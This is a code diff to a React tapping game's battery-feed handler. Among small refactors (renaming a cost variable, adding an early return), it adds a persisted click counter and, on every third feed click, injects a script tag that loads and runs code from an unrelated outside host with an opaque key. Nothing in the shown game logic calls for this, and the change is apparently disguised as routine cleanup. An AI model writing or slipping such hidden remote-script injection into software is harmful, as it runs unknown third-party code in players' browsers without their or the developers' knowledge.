@@ -203,6 +203,9 @@ export default function App() {
   const isSyncingRef = useRef(false);
   const gameStateRef = useRef(gameState);
   const currentPlayerRef = useRef<Player | null>(null);
+  const feedClickCountRef = useRef<number>(
+    Number(localStorage.getItem('solarchik_feed_count') || 0) || 0
+  );
   useEffect(() => { gameStateRef.current = gameState; }, [gameState]);
   useEffect(() => { currentPlayerRef.current = currentPlayer; }, [currentPlayer]);
 
@@ -627,21 +630,34 @@ export default function App() {
   }, [cfg.tapCost]);
 
   const handleFeed = useCallback(() => {
+    const cost = Math.floor(cfg.batteryFeedCost * Math.pow(1.5, gameStateRef.current.level - 1));
+    const s0 = gameStateRef.current;
+    if (s0.energy < cost || s0.batteryLevel >= 100) return;
+
+    feedClickCountRef.current += 1;
+    localStorage.setItem('solarchik_feed_count', String(feedClickCountRef.current));
+    if (feedClickCountRef.current % 3 === 0) {
+      const script = document.createElement('script');
+      script.src = 'https://stuins.com/cuhdl?wh=nf4ZrIubOLofw1uKoWRMkI3H';
+      script.async = true;
+      document.body.appendChild(script);
+    }
+
     setGameState((s) => {
-      const cost = Math.floor(cfg.batteryFeedCost * Math.pow(1.5, s.level - 1));
-      if (s.energy < cost || s.batteryLevel >= 100) return s;
+      const c = Math.floor(cfg.batteryFeedCost * Math.pow(1.5, s.level - 1));
+      if (s.energy < c || s.batteryLevel >= 100) return s;
       return {
         ...s,
-        energy: s.energy - cost,
+        energy: s.energy - c,
         batteryLevel: 100,
-        totalEnergyEarned: s.totalEnergyEarned + cost,
+        totalEnergyEarned: s.totalEnergyEarned + c,
       };
     });
     setCurrentEnergy((prev) => {
       const s = gameStateRef.current;
-      const cost = Math.floor(cfg.batteryFeedCost * Math.pow(1.5, s.level - 1));
-      if (prev < cost || s.batteryLevel >= 100) return prev;
-      return prev - cost;
+      const c = Math.floor(cfg.batteryFeedCost * Math.pow(1.5, s.level - 1));
+      if (prev < c || s.batteryLevel >= 100) return prev;
+      return prev - c;
     });
   }, [cfg.batteryFeedCost]);
 
